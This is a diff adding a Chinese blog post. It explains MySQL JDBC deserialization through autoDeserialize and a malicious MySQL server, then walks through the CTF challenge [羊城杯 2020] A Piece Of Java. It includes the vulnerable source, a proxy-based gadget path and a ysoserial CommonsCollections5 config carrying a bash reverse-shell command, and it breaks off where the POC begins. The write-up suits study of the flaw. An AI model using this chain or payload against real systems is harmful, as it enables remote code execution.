@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='JDBC简介 ​JDBC（Java Database Connectivity）是Java中用来连接和执行查询到数据库的标准API。JDBC提供了一种基础的服务，允许开发者使用SQL语句来查询和更新数据库中的数据。JDBC是跨数据库可移植的，意味着你可以无缝地切换数据库，只需要改变连接字符串和驱动即可。
+MySQL JDBC 漏洞成因 Mysql JDBC 中包含一个危险的扩展参数： &amp;ldquo;autoDeserialize&amp;rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据。
+当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE
+JDBC连接参数
+StatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。自 8.0.7起被queryInterceptors参数替代。
+queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&amp;quot;之间&amp;quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）
+autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。
+detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。
+其他详细参数可在官方文档中查询：
+https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html
+[羊城杯 2020]A Piece Of Java 用的BUU上的环境，先看入口，通过Cookie读取data，反序列化后返回实例化对象info,且该类最后会执行getAllinfo方法,其中userInfo类没有什么可利用的
+@GetMapping({&amp;#34;/hello&amp;#34;}) public String hello(@CookieValue(value = &amp;#34;data&amp;#34;,required = false) String cookieData, Model model) { if (cookieData != null &amp;amp;&amp;amp; !cookieData.equals(&amp;#34;&amp;#34;)) { Info info = (Info)this.deserialize(cookieData); if (info != null) { model.addAttribute(&amp;#34;info&amp;#34;, info.getAllInfo()); } return &amp;#34;hello&amp;#34;; } else { return &amp;#34;redirect:/index&amp;#34;; } } 先看下this.'><title>JAVA入门到放弃系列之JDBC反序列化</title>
+
+<link rel='canonical' href='https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='JAVA入门到放弃系列之JDBC反序列化'>
+<meta property='og:description' content='JDBC简介 ​JDBC（Java Database Connectivity）是Java中用来连接和执行查询到数据库的标准API。JDBC提供了一种基础的服务，允许开发者使用SQL语句来查询和更新数据库中的数据。JDBC是跨数据库可移植的，意味着你可以无缝地切换数据库，只需要改变连接字符串和驱动即可。
+MySQL JDBC 漏洞成因 Mysql JDBC 中包含一个危险的扩展参数： &amp;ldquo;autoDeserialize&amp;rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据。
+当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE
+JDBC连接参数
+StatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。自 8.0.7起被queryInterceptors参数替代。
+queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&amp;quot;之间&amp;quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）
+autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。
+detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。
+其他详细参数可在官方文档中查询：
+https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html
+[羊城杯 2020]A Piece Of Java 用的BUU上的环境，先看入口，通过Cookie读取data，反序列化后返回实例化对象info,且该类最后会执行getAllinfo方法,其中userInfo类没有什么可利用的
+@GetMapping({&amp;#34;/hello&amp;#34;}) public String hello(@CookieValue(value = &amp;#34;data&amp;#34;,required = false) String cookieData, Model model) { if (cookieData != null &amp;amp;&amp;amp; !cookieData.equals(&amp;#34;&amp;#34;)) { Info info = (Info)this.deserialize(cookieData); if (info != null) { model.addAttribute(&amp;#34;info&amp;#34;, info.getAllInfo()); } return &amp;#34;hello&amp;#34;; } else { return &amp;#34;redirect:/index&amp;#34;; } } 先看下this.'>
+<meta property='og:url' content='https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+<meta property='og:site_name' content='Kleinor'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java' /><meta property='article:tag' content='Web' /><meta property='article:published_time' content='2023-07-17T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-07-17T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="JAVA入门到放弃系列之JDBC反序列化">
+<meta name="twitter:description" content="JDBC简介 ​JDBC（Java Database Connectivity）是Java中用来连接和执行查询到数据库的标准API。JDBC提供了一种基础的服务，允许开发者使用SQL语句来查询和更新数据库中的数据。JDBC是跨数据库可移植的，意味着你可以无缝地切换数据库，只需要改变连接字符串和驱动即可。
+MySQL JDBC 漏洞成因 Mysql JDBC 中包含一个危险的扩展参数： &amp;ldquo;autoDeserialize&amp;rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据。
+当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE
+JDBC连接参数
+StatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。自 8.0.7起被queryInterceptors参数替代。
+queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&amp;quot;之间&amp;quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）
+autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。
+detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。
+其他详细参数可在官方文档中查询：
+https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html
+[羊城杯 2020]A Piece Of Java 用的BUU上的环境，先看入口，通过Cookie读取data，反序列化后返回实例化对象info,且该类最后会执行getAllinfo方法,其中userInfo类没有什么可利用的
+@GetMapping({&amp;#34;/hello&amp;#34;}) public String hello(@CookieValue(value = &amp;#34;data&amp;#34;,required = false) String cookieData, Model model) { if (cookieData != null &amp;amp;&amp;amp; !cookieData.equals(&amp;#34;&amp;#34;)) { Info info = (Info)this.deserialize(cookieData); if (info != null) { model.addAttribute(&amp;#34;info&amp;#34;, info.getAllInfo()); } return &amp;#34;hello&amp;#34;; } else { return &amp;#34;redirect:/index&amp;#34;; } } 先看下this.">
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java/" style="background-color: #2a9d8f; color: #fff;">
+                Java
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JAVA入门到放弃系列之JDBC反序列化</a>
+    </h2>
+
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 17, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <h2 id="jdbc简介">JDBC简介</h2>
+<p>  ​JDBC（Java Database Connectivity）是Java中用来连接和执行查询到数据库的标准API。JDBC提供了一种基础的服务，允许开发者使用SQL语句来查询和更新数据库中的数据。JDBC是跨数据库可移植的，意味着你可以无缝地切换数据库，只需要改变连接字符串和驱动即可。</p>
+<h2 id="mysql-jdbc-漏洞成因">MySQL JDBC 漏洞成因</h2>
+<p>  Mysql JDBC 中包含一个危险的扩展参数： &ldquo;autoDeserialize&rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据。</p>
+<p>  当JDBC连接到数据库时，驱动会自动执行<code>SHOW SESSION STATUS</code>和<code>SHOW COLLATION</code>查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE</p>
+<p><strong>JDBC连接参数</strong></p>
+<ul>
+<li>
+<p>StatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。<strong>自 8.0.7起被queryInterceptors参数替代</strong>。</p>
+</li>
+<li>
+<p>queryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query&quot;之间&quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）</p>
+</li>
+<li>
+<p>autoDeserialize:自动检测与反序列化存在BLOB字段中的对象。</p>
+</li>
+<li>
+<p>detectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。</p>
+</li>
+</ul>
+<p>其他详细参数可在官方文档中查询：</p>
+<p><a class="link" href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html"  target="_blank" rel="noopener"
+    >https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html</a></p>
+<h2 id="羊城杯-2020a-piece-of-java">[羊城杯 2020]A Piece Of Java</h2>
+<p>用的BUU上的环境，先看入口，通过Cookie读取data，反序列化后返回实例化对象info,且该类最后会执行getAllinfo方法,其中userInfo类没有什么可利用的</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@GetMapping</span><span class="o">({</span><span class="s">&#34;/hello&#34;</span><span class="o">})</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">(</span><span class="nd">@CookieValue</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;data&#34;</span><span class="o">,</span><span class="n">required</span> <span class="o">=</span> <span class="kc">false</span><span class="o">)</span> <span class="n">String</span> <span class="n">cookieData</span><span class="o">,</span> <span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">cookieData</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">cookieData</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;&#34;</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Info</span> <span class="n">info</span> <span class="o">=</span> <span class="o">(</span><span class="n">Info</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="n">cookieData</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">info</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;info&#34;</span><span class="o">,</span> <span class="n">info</span><span class="o">.</span><span class="na">getAllInfo</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;hello&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;redirect:/index&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>先看下this.deserialize，其引入了SerialKiller-3.0来实现反序列化</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span> <span class="n">Object</span> <span class="nf">deserialize</span><span class="o">(</span><span class="n">String</span> <span class="n">base64data</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ByteArrayInputStream</span> <span class="n">bais</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">base64data</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SerialKiller</span><span class="o">(</span><span class="n">bais</span><span class="o">,</span> <span class="s">&#34;serialkiller.conf&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ois</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var5</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">var5</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>看下SerialKiller配置serialkiller.conf，有个白名单过滤，只能反序列化 gdufs 包和 java.lang 包下面的类，因此虽然存在依赖commons-collections3.2.1但不能直接用CC链打</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="o">?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;!--</span> <span class="n">serialkiller</span><span class="o">.</span><span class="na">conf</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">config</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">refresh</span><span class="o">&gt;</span><span class="mi">6000</span><span class="o">&lt;/</span><span class="n">refresh</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">mode</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;!--</span> <span class="n">set</span> <span class="n">to</span> <span class="err">&#39;</span><span class="kc">false</span><span class="err">&#39;</span> <span class="k">for</span> <span class="n">blocking</span> <span class="n">mode</span> <span class="o">--&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">profiling</span><span class="o">&gt;</span><span class="kc">false</span><span class="o">&lt;/</span><span class="n">profiling</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">mode</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">blacklist</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">blacklist</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">whitelist</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">regexp</span><span class="o">&gt;</span><span class="n">gdufs</span><span class="err">\</span><span class="o">..*&lt;/</span><span class="n">regexp</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">regexp</span><span class="o">&gt;</span><span class="n">java</span><span class="err">\</span><span class="o">.</span><span class="na">lang</span><span class="err">\</span><span class="o">..*&lt;/</span><span class="n">regexp</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="n">whitelist</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">config</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>我们把目光移到databaseInfo类上，里面可以通过jdbc连接任意mysql服务器，用的mysql-connector-java-8.0.19</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">	<span class="kd">private</span> <span class="kt">void</span> <span class="nf">connect</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;jdbc:mysql://&#34;</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">host</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">+</span> <span class="s">&#34;/jdbc?user=&#34;</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">+</span> <span class="s">&#34;&amp;password=&#34;</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">+</span> <span class="s">&#34;&amp;connectTimeout=3000&amp;socketTimeout=6000&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var3</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">public</span> <span class="n">Boolean</span> <span class="nf">checkAllInfo</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">host</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">connect</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></div><p>并且存在一个动态代理的实现类 InvocationHandler 类，可以调用checkAllInfo，最终调用databaseInfo类的connect()。(Java的动态代理相关知识点，可以参考这篇文章https://tttang.com/archive/1769/)。要触发invoke()需要被Proxy代理类封装且被执行方法。因此我们可以得到触发条件就是在之前分析中实例化后的对象执行info.getAllinfo()。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">InfoInvocationHandler</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Info</span> <span class="n">info</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">InfoInvocationHandler</span><span class="o">(</span><span class="n">Info</span> <span class="n">info</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">info</span> <span class="o">=</span> <span class="n">info</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;getAllInfo&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">this</span><span class="o">.</span><span class="na">info</span><span class="o">.</span><span class="na">checkAllInfo</span><span class="o">()</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">info</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var5</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var5</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>综合以上分析，题目的整体思路清楚了，以/hello路由为入口，通过Cookie传入data，将databaseInfo类封装进InvocationHandler类，通过hello路由中的info.getAllInfo()方法触发invoke方法且满足判断条件<code>method.getName().equals(&quot;getAllInfo&quot;) &amp;&amp; !this.info.checkAllInfo()</code>为false正常调用Info对象方法，然后由checkAllInfo触发databaseInfo类的connect()，最终完成JDBC反序列化的触发，我们要在password字段中拼接参数构造JDBCURL访问我们的恶意Mysql服务，其向客户端打CC5链的payload。</p>
+<p>(用CC5链是因为serialkiller通过maven 仓库中查询可知其存在cc3.2.1依赖)</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718175629.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718175629.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>其中恶意mysql服务用大佬造好的轮子https://github.com/fnmsd/MySQL_Fake_Server</p>
+<p>将ysoserial放到同路径下，配置一下config.json，访问Cc5即执行对应的命令。</p>
+<pre><code>&quot;yso&quot;:{
+    &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],
+     &quot;Cc5&quot;:[&quot;CommonsCollections5&quot;,&quot;bash -c {echo,反弹shell}|{base64,-d}|{bash,-i}&quot;]
+}
+</code></pre>
+<p>POC:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">gdufs.challenge.web</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gdufs.challenge.web.*</span><span class="o">;</span>
